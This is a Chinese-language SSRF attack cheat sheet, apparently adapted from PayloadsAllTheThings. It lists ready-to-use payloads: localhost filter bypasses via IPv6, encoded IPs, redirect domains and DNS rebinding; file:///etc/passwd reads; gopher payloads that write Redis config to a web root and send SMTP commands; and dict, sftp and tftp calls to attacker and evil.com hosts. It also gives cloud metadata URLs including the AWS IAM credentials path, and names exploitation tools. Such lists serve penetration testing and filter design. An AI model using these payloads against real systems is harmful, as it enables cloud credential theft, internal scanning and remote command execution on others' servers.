# SSRF - 服务端请求伪造

[SEARCH_KEYWORDS]
漏洞类型: SSRF Server-Side Request Forgery 服务端请求伪造
攻击类型: File Read Port Scan Cloud Metadata Internal Network Access
关键词: localhost 127.0.0.1 169.254.169.254 metadata gopher dict file
协议: file:// http:// https:// dict:// sftp:// tftp:// ldap:// gopher:// netdoc://
绕过技术: IPv6 Encoding Redirect DNS Rebinding CIDR Domain Redirect
云平台: AWS GCP Azure Alibaba DigitalOcean Oracle Cloud Kubernetes Docker

[CONTENT]

## SSRF 漏洞概述

服务端请求伪造(SSRF)是一种安全漏洞，攻击者可以操纵服务器向非预期位置发起HTTP请求。当服务器处理用户提供的URL或IP地址时，如果缺乏适当验证，就会发生这种情况。

## 常见利用路径

- 访问云元数据服务
- 泄露服务器文件
- 网络发现和端口扫描
- 向网络中特定服务发送数据包，实现远程命令执行

## 过滤器绕过技术

### Localhost绕过

```powershell
# IPv6表示
http://[::]:80/
http://[0000::1]:80/
http://[::ffff:127.0.0.1]

# CIDR绕过 (127.0.0.0/8)
http://127.127.127.127
http://127.0.1.3

# 简写IP
http://0/
http://127.1
http://127.0.1

# 编码IP
http://2130706433/  # = 127.0.0.1 十进制
http://0177.0.0.1/  # 八进制
```

### 域名重定向

| 域名 | 重定向到 |
|------|----------|
| localtest.me | ::1 |
| localh.st | 127.0.0.1 |
| 127.0.0.1.nip.io | 127.0.0.1 |

### DNS重绑定

```powershell
make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
```

## URL协议利用

### file:// - 文件读取

```powershell
file:///etc/passwd
file://\/\/etc/passwd
```

### http:// - 端口扫描

```powershell
http://127.0.0.1:22
http://127.0.0.1:80
http://127.0.0.1:443
```

### dict:// - DICT协议

```powershell
dict://attacker:11111/
```

### gopher:// - TCP数据发送

```powershell
gopher://localhost:25/_MAIL%20FROM:<attacker@example.com>%0D%0A
gopher://127.0.0.1:6379/_config%20set%20dir%20%2Fvar%2Fwww%2Fhtml
```

### 其他协议

```powershell
sftp://evil.com:11111/
tftp://evil.com:12346/TESTUDPPACKET
ldap://localhost:11211/%0astats%0aquit
netdoc:///etc/passwd
```

## 云元数据端点

### AWS

```powershell
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials
http://169.254.169.254/latest/user-data
```

### Google Cloud

```powershell
http://metadata.google.internal/computeMetadata/v1/
# 需要Header: Metadata-Flavor: Google
```

### Azure

```powershell
http://169.254.169.254/metadata/instance?api-version=2017-04-02
# 需要Header: Metadata: true
```

## 工具

- SSRFmap - 自动SSRF模糊测试和利用工具
- Gopherus - 生成gopher链接利用SSRF
- See-SURF - SSRF参数扫描器
- surf - SSRF候选发现工具

## 参考文档

原始来源: PayloadsAllTheThings/Server Side Request Forgery/README.md